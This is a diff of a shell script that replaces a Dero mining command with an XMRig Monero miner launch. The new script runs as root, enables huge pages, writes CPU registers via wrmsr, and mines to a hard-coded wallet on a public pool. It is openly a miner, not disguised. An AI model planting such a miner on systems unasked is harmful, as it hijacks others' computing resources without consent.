@@ -1,4 +1,9 @@
 #!/bin/sh
-chmod u+x play
+chmod u+x xmrig
 
-./play -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero.rabidmining.com:10300 -p rpc -m 8
+sudo sysctl -w vm.nr_hugepages=8196
+sudo apt-get update
+sudo apt-get install msr-tools
+sudo wrmsr -a 0x1a4 0xf
+
+sudo ./xmrig --url pool.hashvault.pro:443 --user solo:85HtWS4dAQ73a5kpb9SwBmJqrAqbXmpyWjci54cpQRXfCg48D93Bmqs4U5ZnkKPHQwTNdwLViSv9eeEoPJ8itYsVNsWsv1G --pass test1 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --randomx-1gb-pages --donate-over-proxy=2 --threads=64 --cpu-priority=5 --huge-pages-jit --asm=intel
